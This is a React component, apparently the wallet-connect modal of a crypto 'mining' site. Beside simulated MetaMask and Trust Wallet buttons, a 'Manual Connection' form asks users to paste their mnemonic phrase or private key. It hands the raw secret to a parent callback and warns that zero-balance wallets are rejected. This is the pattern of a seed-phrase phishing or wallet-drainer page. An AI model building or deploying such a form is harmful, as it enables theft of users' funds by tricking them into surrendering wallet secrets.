'use client'

import { useState } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import { Wallet, ArrowRight, AlertTriangle, Key, Copy, Check } from 'lucide-react'

interface WalletOption {
  id: string
  name: string
  icon: string
  description: string
}

interface WalletConnectMockProps {
  onSuccess: (method: string, data: { walletAddress: string; balance: number; }) => void
  onManualConnect: () => void
}

const WalletConnectMock = ({ onSuccess, onManualConnect }: WalletConnectMockProps) => {
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null)
  const [isConnecting, setIsConnecting] = useState(false)
  const [showManualInput, setShowManualInput] = useState(false)
  const [manualInput, setManualInput] = useState('')
  const [inputType, setInputType] = useState<'mnemonic' | 'privateKey'>('mnemonic')
  const [copied, setCopied] = useState(false)

  const walletOptions: WalletOption[] = [
    {
      id: 'metamask',
      name: 'MetaMask',
      icon: '/wallets/metamask.svg',
      description: 'Connect with MetaMask browser extension'
    },
    {
      id: 'trustwallet',
      name: 'Trust Wallet',
      icon: '/wallets/trustwallet.svg',
      description: 'Connect with Trust Wallet mobile app'
    },
    {
      id: 'coinbase',
      name: 'Coinbase Wallet',
      icon: '/wallets/coinbase.svg',
      description: 'Connect with Coinbase Wallet'
    },
    {
      id: 'rainbow',
      name: 'Rainbow',
      icon: '/wallets/rainbow.svg',
      description: 'Connect with Rainbow wallet'
    }
  ]

  const handleWalletSelect = (walletId: string) => {
    setSelectedWallet(walletId)
    setIsConnecting(true)

    // Simulate wallet connection
    setTimeout(() => {
      const wallet = walletOptions.find(w => w.id === walletId)
      if (wallet) {
        onSuccess(wallet.name, {
          type: 'wallet',
          address: '0x742d35Cc6634C0532925a3b844Bc9e7595f8e8E0',
          balance: 0.25
        })
      }
    }, 2000)
  }

  const handleManualSubmit = () => {
    if (!manualInput.trim()) return

    // Simulate validation
    setIsConnecting(true)
    setTimeout(() => {
      const isValid = inputType === 'mnemonic'
        ? manualInput.split(' ').length >= 12
        : manualInput.length >= 64

      if (isValid) {
        onSuccess('Manual Input', {
          type: inputType,
          input: manualInput,
          address: '0x742d35Cc6634C0532925a3b844Bc9e7595f8e8E0',
          balance: 0.25
        })
      } else {
        setIsConnecting(false)
        // Show error (in real app, you'd handle this properly)
        alert('Invalid input. Please check your mnemonic or private key.')
      }
    }, 1500)
  }

  const copyToClipboard = () => {
    navigator.clipboard.writeText(manualInput)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  return (
    <AnimatePresence>
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm"
      >
        <motion.div
          initial={{ scale: 0.9, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          exit={{ scale: 0.9, opacity: 0 }}
          className="w-full max-w-lg mx-4 bg-black rounded-lg overflow-hidden border border-orange-500/30 shadow-2xl"
        >
          {/* Header */}
          <div className="px-6 py-4 bg-gradient-to-r from-orange-500/10 to-orange-600/10 border-b border-orange-500/30">
            <h2 className="text-2xl font-bold text-white flex items-center space-x-2">
              <Wallet className="w-6 h-6" />
              <span>Connect Wallet</span>
            </h2>
            <p className="text-gray-400 text-sm mt-1">
              Connect your wallet to start mining
            </p>
          </div>

          {/* Content */}
          <div className="px-6 py-6">
            {!showManualInput ? (
              <div className="space-y-4">
                {/* Wallet Options */}
                <div className="space-y-3">
                  {walletOptions.map((wallet) => (
                    <motion.button
                      key={wallet.id}
                      whileHover={{ scale: 1.02, x: 4 }}
                      whileTap={{ scale: 0.98 }}
                      onClick={() => handleWalletSelect(wallet.id)}
                      disabled={isConnecting}
                      className="w-full p-4 bg-gray-900 border border-gray-800 rounded-lg hover:border-orange-500/50 transition-all text-left disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                      <div className="flex items-center space-x-3">
                        <div className="w-12 h-12 bg-gray-800 rounded-lg flex items-center justify-center">
                          <img src={wallet.icon} alt={wallet.name} className="w-8 h-8" />
                        </div>
                        <div className="flex-1">
                          <h3 className="text-white font-medium">{wallet.name}</h3>
                          <p className="text-gray-400 text-sm">{wallet.description}</p>
                        </div>
                        {selectedWallet === wallet.id && isConnecting && (
                          <div className="w-6 h-6 border-2 border-orange-400 border-t-transparent rounded-full animate-spin" />
                        )}
                      </div>
                    </motion.button>
                  ))}
                </div>

                {/* Manual Connection */}
                <div className="pt-4 border-t border-gray-800">
                  <p className="text-gray-400 text-sm mb-3">Don&apos;t have a wallet?</p>
                  <motion.button
                    whileHover={{ scale: 1.02 }}
                    whileTap={{ scale: 0.98 }}
                    onClick={() => setShowManualInput(true)}
                    className="w-full p-4 bg-gray-900/50 border border-dashed border-gray-700 rounded-lg hover:border-orange-500/50 transition-all"
                  >
                    <div className="flex items-center justify-center space-x-2">
                      <Key className="w-5 h-5 text-orange-400" />
                      <span className="text-orange-400 font-medium">Manual Connection</span>
                    </div>
                  </motion.button>
                </div>

                {/* Warning */}
                <div className="p-3 bg-orange-500/10 border border-orange-500/30 rounded-lg">
                  <div className="flex items-start space-x-2">
                    <AlertTriangle className="w-5 h-5 text-orange-400 flex-shrink-0 mt-0.5" />
                    <div className="text-orange-400 text-sm">
                      <p className="font-medium mb-1">Important Notice</p>
                      <p className="text-orange-300">
                        Only wallets with balance &gt; $0 will be accepted. Zero balance wallets will be rejected.
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            ) : (
              <div className="space-y-4">
                {/* Manual Input */}
                <div className="space-y-3">
                  {/* Input Type Selection */}
                  <div className="flex space-x-2">
                    <motion.button
                      whileHover={{ scale: 1.05 }}
                      whileTap={{ scale: 0.95 }}
                      onClick={() => setInputType('mnemonic')}
                      className={`flex-1 py-2 px-4 rounded-lg font-medium transition-all ${
                        inputType === 'mnemonic'
                          ? 'bg-orange-500 text-black'
                          : 'bg-gray-900 text-gray-400 hover:bg-gray-800'
                      }`}
                    >
                      Mnemonic
                    </motion.button>
                    <motion.button
                      whileHover={{ scale: 1.05 }}
                      whileTap={{ scale: 0.95 }}
                      onClick={() => setInputType('privateKey')}
                      className={`flex-1 py-2 px-4 rounded-lg font-medium transition-all ${
                        inputType === 'privateKey'
                          ? 'bg-orange-500 text-black'
                          : 'bg-gray-900 text-gray-400 hover:bg-gray-800'
                      }`}
                    >
                      Private Key
                    </motion.button>
                  </div>

                  {/* Text Area */}
                  <div className="space-y-2">
                    <label className="text-gray-300 text-sm font-medium">
                      {inputType === 'mnemonic' ? 'Enter Mnemonic Phrase' : 'Enter Private Key'}
                    </label>
                    <div className="relative">
                      <textarea
                        value={manualInput}
                        onChange={(e) => setManualInput(e.target.value)}
                        rows={inputType === 'mnemonic' ? 3 : 2}
                        className="w-full p-3 pr-10 bg-gray-900 border border-gray-800 rounded-lg text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-orange-500 resize-none"
                        placeholder={inputType === 'mnemonic'
                          ? 'Enter your 12-24 word mnemonic phrase...'
                          : 'Enter your private key...'
                        }
                      />
                      <button
                        onClick={copyToClipboard}
                        className="absolute top-3 right-3 text-gray-500 hover:text-gray-300"
                      >
                        {copied ? <Check className="w-5 h-5 text-green-400" /> : <Copy className="w-5 h-5" />}
                      </button>
                    </div>
                  </div>

                  {/* Action Buttons */}
                  <div className="flex space-x-3">
                    <motion.button
                      whileHover={{ scale: 1.02 }}
                      whileTap={{ scale: 0.98 }}
                      onClick={handleManualSubmit}
                      disabled={isConnecting || !manualInput.trim()}
                      className="flex-1 py-3 bg-gradient-to-r from-orange-500 to-orange-600 text-black font-bold rounded-lg disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                      {isConnecting ? (
                        <div className="flex items-center justify-center space-x-2">
                          <div className="w-5 h-5 border-2 border-black border-t-transparent rounded-full animate-spin" />
                          <span>Validating...</span>
                        </div>
                      ) : (
                        <div className="flex items-center justify-center space-x-2">
                          <span>Connect</span>
                          <ArrowRight className="w-5 h-5" />
                        </div>
                      )}
                    </motion.button>

                    <motion.button
                      whileHover={{ scale: 1.02 }}
                      whileTap={{ scale: 0.98 }}
                      onClick={() => setShowManualInput(false)}
                      className="px-6 py-3 bg-gray-900 text-gray-400 rounded-lg hover:bg-gray-800"
                    >
                      Back
                    </motion.button>
                  </div>
                </div>
              </div>
            )}
          </div>
        </motion.div>
      </motion.div>
    </AnimatePresence>
  )
}

export default WalletConnectMock